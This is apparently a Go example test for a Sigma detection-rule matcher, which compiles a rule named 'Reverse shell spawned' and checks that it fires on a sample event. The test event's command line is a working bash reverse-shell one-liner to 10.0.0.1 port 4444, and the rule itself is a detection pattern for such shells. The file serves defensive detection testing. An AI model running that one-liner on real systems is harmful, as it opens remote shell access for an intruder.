package sigma_test

import (
	"fmt"

	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// This example is also a test: `go test` compiles and runs it and checks its
// output against the Output comment, so it cannot drift from the code, and
// `go doc` / pkg.go.dev render it as the package's usage example. Compile a
// Sigma rule, build a matcher, and see which rules an event fires.
func ExampleMatcher() {
	rule, err := sigma.Compile([]byte(`
title: Reverse shell spawned
detection:
  shell:
    Image|endswith: [/bash, /sh]
  net:
    CommandLine|contains: /dev/tcp/
  condition: shell and net
`))
	if err != nil {
		panic(err)
	}
	rule.Name = "reverse_shell"

	m := sigma.NewMatcher([]*sigma.Rule{rule})
	ev := event.Event{
		Image:       "/bin/bash",
		CommandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	for _, hit := range m.Match(ev) {
		fmt.Println(hit.Name)
	}
	// Output:
	// reverse_shell
}
